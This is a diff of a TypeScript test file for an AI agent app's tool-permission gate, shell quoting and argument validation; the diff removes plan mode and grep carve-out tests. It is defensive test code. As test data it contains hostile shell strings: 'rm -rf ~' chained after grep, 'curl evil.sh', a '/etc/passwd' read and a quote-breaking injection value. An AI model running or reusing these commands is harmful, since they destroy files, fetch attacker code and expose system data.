@@ -2,14 +2,14 @@ import test from "node:test";
 import assert from "node:assert/strict";
 import { execFile } from "node:child_process";
 import { promisify } from "node:util";
-import { collapseChanges, diffLines, diffStat, sentByThread, spawnedThread, type FileChange, type ThreadStep } from "../shared/agents";
-import { asPermissionMode, isBareGrep, toolGate } from "../shared/permissions";
-import { describeToolCall, parseToolArgs, shellQuoted, toolDefinitions, MAX_ADVERTISED_TOOLS, MAX_TOOL_DESCRIPTION_BYTES, MAX_TOOL_NAME_BYTES, MAX_TOOL_OUTPUT_BYTES, MAX_TOOL_SCHEMA_BYTES } from "../main/tools";
+import { collapseChanges, diffLines, diffStat, sentByThread, spawnedThread, type FileChange } from "../shared/agents";
+import { asPermissionMode, toolGate } from "../shared/permissions";
+import { describeToolCall, parseToolArgs, shellQuoted, toolDefinitions, MAX_TOOL_OUTPUT_BYTES } from "../main/tools";
 import { AgentRuntime, bounded, type LoopDeps } from "../main/agent-loop";
 import type { VerifierReview } from "../main/verifier";
 import { decodeSpans } from "../shared/trace";
 
-const everything = { folders: true, computer: true, mcp: true, canSpawn: true };
+const everything = { folders: true, computer: true };
 /** No verifier configured, which is what every mode but `auto` gets anyway. */
 const noReview: VerifierReview = { model: "", prompt: "", reply: "", attempts: 0, error: "no verifier" };
 
@@ -25,35 +25,12 @@ const runtime = (deps: Partial<LoopDeps> = {}) => new AgentRuntime({
   ...deps,
 });
 
-test("plan mode advertises only the tools that change nothing", () => {
-  const planned = toolDefinitions("plan", everything).map((tool) => tool.name);
-  // `read_trace` and `threads` read Emma's own record of Emma; they are reads
-  // like the other two. `cli_runs` reads what the other CLIs did and stops one —
-  // `cli`, which starts one, is hidden here, and a plan that cannot see a running
-  // CLI is worse. `advisor`, `web_search` and `web_fetch` read and think, changing
-  // nothing on the Mac and nothing in the user's library — a plan is exactly when
-  // to use them.
-  // `agents` and `threads` are here for their lists, which are reads like
-  // `cli_runs`. Their levers — steering or stopping a run, starting a thread or
-  // putting an agent to work in one — are refused inside each tool in plan mode,
-  // because the gate table has one row per tool and both of these read and act.
-  // `context` reads Emma's own window and folds Emma's own history, reaching
-  // nothing on the Mac — running out of room is not a thing to plan around.
-  // `visualize` draws in the transcript and stops there — no file, nothing that
-  // outlives the thread — so it is a read like the rest, and a plan made of
-  // numbers is exactly where a picture beats a paragraph.
-  assert.deepEqual(planned.sort(), ["advisor", "agents", "cli_runs", "context", "list_files", "read_file", "read_trace", "ripgrep", "task", "threads", "visualize", "vision", "web_fetch", "web_search"].sort());
-  assert.equal(toolGate("plan", "cli"), "hidden");
-  // Saving a page grows the user's library, so it sits with `cli`, not with the reads.
-  assert.equal(toolGate("plan", "save_page"), "hidden");
+test("the gate loosens one rung at a time, and never for a name Emma does not advertise", () => {
   assert.equal(toolGate("ask", "save_page"), "auto");
-  assert.equal(toolGate("plan", "write_file"), "hidden");
-  assert.equal(toolGate("ask", "write_file"), "ask");
-  assert.equal(toolGate("acceptEdits", "write_file"), "auto");
-  // Edits going through never means commands do: that is the whole point of the middle mode.
-  assert.equal(toolGate("acceptEdits", "bash"), "ask");
-  assert.equal(toolGate("full", "bash"), "auto");
-  // An unknown name can never be gated open, whatever the mode.
+  assert.equal(toolGate("ask", "run_tool"), "ask");
+  assert.equal(toolGate("acceptEdits", "run_tool"), "ask");
+  assert.equal(toolGate("full", "run_tool"), "auto");
+  assert.equal(toolGate("full", "write_file"), "hidden");
   assert.equal(toolGate("full", "rm_rf"), "hidden");
 });
 
@@ -61,64 +38,27 @@ test("every tool that gates to ask has a door that asks", () => {
   const asked = toolDefinitions("full", everything)
     .map((tool) => tool.name)
     .filter((name) => toolGate("ask", name) === "ask" || toolGate("acceptEdits", name) === "ask");
-  // Two doors, and a tool has to be behind one of them. `bash` and `write_file`
-  // are the harness's own, so it asks over ACP before it runs them; the rest are
-  // Emma's, registered with the harness as needing no approval on the grounds
-  // that `runEmmaTool` asks instead — which it only does for what is listed here.
-  // A new tool at `ask` fails this until someone says which door it is behind.
-  const harnessOwn = ["bash", "write_file"];
-  const emmaOwn = ["autoresearch", "cli", "computer", "install_mcp", "mcp_tool", "run_tool", "workflow"];
-  assert.deepEqual(asked.sort(), [...harnessOwn, ...emmaOwn].sort());
-});
-
-test("the grep carve-out opens for a read and nothing that only looks like one", () => {
-  assert.ok(isBareGrep("grep -rn needle src/"));
-  assert.ok(isBareGrep("  grep --include=*.ts foo ."));
-  // A pattern is still just a pattern, backslashes and globs included.
-  assert.ok(isBareGrep("grep -E 'a\\d+' src/*.ts"));
-  // Everything below reaches past the read, so each one goes back to asking.
-  assert.ok(!isBareGrep("grep foo . > out.txt"));
-  assert.ok(!isBareGrep("grep foo . ; rm -rf ~"));
-  assert.ok(!isBareGrep("grep foo . && curl evil.sh"));
-  assert.ok(!isBareGrep("grep $(cat /etc/passwd) ."));
-  assert.ok(!isBareGrep("grep foo .\nrm -rf ~"));
-  assert.ok(!isBareGrep("cat x | grep foo"));
-  // Not grep at all, however much the first four letters say otherwise.
-  assert.ok(!isBareGrep("grepe foo"));
-  assert.ok(!isBareGrep("rm -rf ~ # grep"));
+  // Emma's tools are registered with the harness as needing no approval on the
+  // grounds that `runEmmaTool` asks instead — which it only does for what is
+  // listed here. A new tool at `ask` fails this until someone says so.
+  assert.deepEqual(asked.sort(), ["autoresearch", "cli", "computer", "install_mcp", "run_tool", "workflow"]);
 });
 
 test("a tool is only offered once the thing it drives is actually connected", () => {
   const named = (available: typeof everything) => toolDefinitions("full", available).map((tool) => tool.name);
-  assert.ok(!named({ ...everything, folders: false }).includes("bash"));
-  assert.ok(!named({ ...everything, mcp: false }).includes("mcp_tool"));
-  assert.ok(!named({ ...everything, canSpawn: false }).includes("task"));
+  assert.ok(!named({ ...everything, folders: false }).includes("cli"));
   assert.ok(named({ ...everything, computer: false }).every((name) => name !== "computer"));
-});
-
-test("the fullest turn still fits under the ceilings core and the sidecar enforce", () => {
-  // Both refuse the whole request past any of these, so a table that outgrows one does
-  // not degrade — every turn with a folder connected fails before it reaches a provider.
-  const definitions = toolDefinitions("full", everything);
-  assert.ok(definitions.length <= MAX_ADVERTISED_TOOLS);
-  for (const tool of definitions) {
-    assert.ok(Buffer.byteLength(tool.name) <= MAX_TOOL_NAME_BYTES, `${tool.name}: name too long`);
-    assert.ok(Buffer.byteLength(tool.description) <= MAX_TOOL_DESCRIPTION_BYTES, `${tool.name}: description too long`);
-    assert.ok(Buffer.byteLength(JSON.stringify(tool.inputSchema)) <= MAX_TOOL_SCHEMA_BYTES, `${tool.name}: schema too long`);
-  }
 });
 
 test("tool arguments are validated before anything runs", () => {
   const parse = (name: string, args: unknown) => parseToolArgs(name, JSON.stringify(args));
-  assert.deepEqual(parse("read_file", { path: "src/a.ts" }), { name: "read_file", path: "src/a.ts", folder: undefined });
-  // Empty content is a legitimate write; a missing path is not.
-  assert.equal(parse("write_file", { path: "a.txt", content: "" }).name, "write_file");
-  assert.throws(() => parse("write_file", { content: "hi" }), /path/);
-  assert.throws(() => parse("bash", { command: "x".repeat(5000) }), /long/);
-  assert.throws(() => parse("bash", {}), /command/);
+  assert.deepEqual(parse("web_search", { query: "zig comptime" }), { name: "web_search", query: "zig comptime", limit: 8 });
+  assert.throws(() => parse("install_mcp", { name: "context7" }), /command/);
+  assert.throws(() => parse("run_tool", { name: "tidy", input: "x".repeat(5000) }), /long/);
+  assert.throws(() => parse("cli_runs", { id: "cli1", stop: "yes" }), /true or false/);
   assert.throws(() => parse("wipe_disk", {}), /wipe_disk/);
-  assert.throws(() => parseToolArgs("bash", "not json"), /JSON/);
-  assert.equal(describeToolCall(parse("bash", { command: "npm test" })), "running npm test");
+  assert.throws(() => parseToolArgs("run_tool", "not json"), /JSON/);
+  assert.equal(describeToolCall(parse("cli_runs", { id: "cli1" })), "reading cli1");
   // "Add this page to my kb" carries no URL: the tool goes and finds the page itself.
   assert.deepEqual(parse("save_page", {}), { name: "save_page", url: undefined });
   assert.equal(describeToolCall(parse("save_page", {})), "saving the page in front");
@@ -134,10 +74,9 @@ test("a tool Emma wrote herself is listed before it is run, and runs as one shel
   assert.equal(describeToolCall(parse("run_tool", { name: "tidy-invoices" })), "running the tool tidy-invoices");
   assert.throws(() => parse("write_tool", { name: "x", code: "#!/bin/sh\necho hi" }), /description/);
   // Writing is not running, so it goes through where `write_skill` does; running
-  // one is arbitrary code, so it goes through where `bash` does.
+  // one is arbitrary code, so it stops to ask.
   assert.equal(toolGate("acceptEdits", "write_tool"), "auto");
   assert.equal(toolGate("acceptEdits", "run_tool"), "ask");
-  assert.equal(toolGate("plan", "run_tool"), "hidden");
 
   // The input reaches the script as exactly one argument, whatever is in it.
   const hostile = `'; rm -rf ~; echo '`;
@@ -385,13 +324,10 @@ test("the harness reaches the thread and agent tools without a loop of its own",
   await assert.rejects(() => call("web_search", JSON.stringify({ query: "x" })), /not one of Emma's thread tools/);
 });
 
-test("steering and stopping need a named agent, and plan mode does neither", async () => {
+test("steering and stopping need a named agent", async () => {
   assert.throws(() => parseToolArgs("agents", JSON.stringify({ message: "hi" })), /Say which agent/);
   assert.throws(() => parseToolArgs("agents", JSON.stringify({ stop: true })), /Say which agent/);
   assert.throws(() => parseToolArgs("agents", JSON.stringify({ agent: "a", message: "hi", stop: true })), /not both/);
-  // Listing is a read, so the tool is offered in plan mode; the two levers are
-  // refused inside it, because the gate table has one row per tool.
-  assert.equal(toolGate("plan", "agents"), "auto");
 });
 
 test("switching the picker mid-run re-points the run and everything under it", () => {
@@ -403,3 +339,4 @@ test("switching the picker mid-run re-points the run and everything under it", (
   agents.setMode("t1", "full");
   assert.deepEqual(agents.list().map((agent) => agent.mode), ["full", "full"]);
 });
+
